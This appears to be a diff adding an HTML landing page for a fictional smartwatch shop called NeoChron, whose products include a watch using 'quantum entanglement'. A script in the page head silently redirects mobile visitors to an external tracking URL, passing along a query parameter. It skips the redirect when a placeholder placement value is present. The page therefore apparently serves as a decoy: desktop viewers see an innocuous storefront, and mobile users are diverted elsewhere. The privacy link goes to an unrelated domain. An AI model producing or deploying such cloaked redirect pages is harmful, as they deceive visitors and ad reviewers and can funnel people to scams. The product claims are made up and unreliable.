@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://klcxb6.mcgo2.com/visit/01b0b9bd-7174-4996-ab3d-a899c514fef6?s1=${s}`;
+    if (utmXXX === "__PLACEMENT__") {
+    } else if (isMobileDevice) {
+        window.location.href = lander;
+    } else {
+    }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>NeoChron: The Future on Your Wrist</title>
+    <style>
+        @keyframes neonGlow {
+            0% { box-shadow: 0 0 5px #0ff, 0 0 10px #0ff, 0 0 15px #0ff, 0 0 20px #0ff; }
+            50% { box-shadow: 0 0 10px #f0f, 0 0 20px #f0f, 0 0 30px #f0f, 0 0 40px #f0f; }
+            100% { box-shadow: 0 0 5px #0ff, 0 0 10px #0ff, 0 0 15px #0ff, 0 0 20px #0ff; }
+        }
+        body {
+            font-family: 'Orbitron', sans-serif;
+            background-color: #000;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            display: grid;
+            grid-template-rows: auto 1fr auto;
+            min-height: 100vh;
+        }
+        header {
+            background: linear-gradient(90deg, #0a0a0a, #1a1a1a);
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: space-around;
+            align-items: center;
+            padding: 40px;
+        }
+        .watch-card {
+            background: rgba(20, 20, 20, 0.8);
+            border-radius: 15px;
+            padding: 20px;
+            margin: 20px;
+            width: 300px;
+            text-align: center;
+            transition: transform 0.3s ease;
+            animation: neonGlow 3s infinite alternate;
+        }
+        .watch-card:hover {
+            transform: scale(1.05);
+        }
+        .watch-image {
+            width: 200px;
+            height: 200px;
+            background: radial-gradient(circle, #333, #000);
+            border-radius: 50%;
+            margin: 0 auto 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 18px;
+            color: #0ff;
+        }
+        footer {
+            background-color: #0a0a0a;
+            padding: 10px;
+            text-align: center;
+        }
+        nav {
+            display: flex;
+            justify-content: space-around;
+            padding: 10px 0;
+            background: rgba(10, 10, 10, 0.8);
+            position: sticky;
+            top: 0;
+            z-index: 1000;
+        }
+        nav a {
+            color: #0ff;
+            text-decoration: none;
+            font-weight: bold;
+            transition: color 0.3s ease;
+        }
+        nav a:hover {
+            color: #f0f;
+        }
+        h1 {
+            font-size: 3em;
+            margin-bottom: 10px;
+            text-shadow: 0 0 10px #0ff;
+        }
+        h2 {
+            color: #0ff;
+        }
+        p {
+            color: #ccc;
+        }
+        .price {
+            font-weight: bold;
+            color: #f0f;
+            font-size: 1.2em;
+            margin-top: 10px;
+        }
+        footer a {
+            color: #0ff;
+            text-decoration: none;
+        }
+        footer a:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>NeoChron</h1>
+        <p>The Future on Your Wrist</p>
+    </header>
+    <nav>
+        <a href="#">Home</a>
+        <a href="#">Innovations</a>
+        <a href="#">Tech Specs</a>
+        <a href="#">Order Now</a>
+    </nav>
+    <main>
+        <div class="watch-card">
+            <div class="watch-image">HoloTime X1</div>
+            <h2>HoloTime X1</h2>
+            <p>Holographic display with gesture controls</p>
+            <p class="price">$2,999.99</p>
+        </div>
+        <div class="watch-card">
+            <div class="watch-image">QuantumSync Pro</div>
+            <h2>QuantumSync Pro</h2>
+            <p>Quantum entanglement for perfect global synchronization</p>
+            <p class="price">$4,599.99</p>
+        </div>
+        <div class="watch-card">
+            <div class="watch-image">BioRhythm Elite</div>
+            <h2>BioRhythm Elite</h2>
+            <p>AI-powered health prediction and optimization</p>
+            <p class="price">$3,799.99</p>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2024 NeoChron Technologies. Shaping the future of timekeeping.</p>
+        <a href="https://tokreward.com/privacy.html">Privacy Policy</a>
+    </footer>
+</body>
+</html>
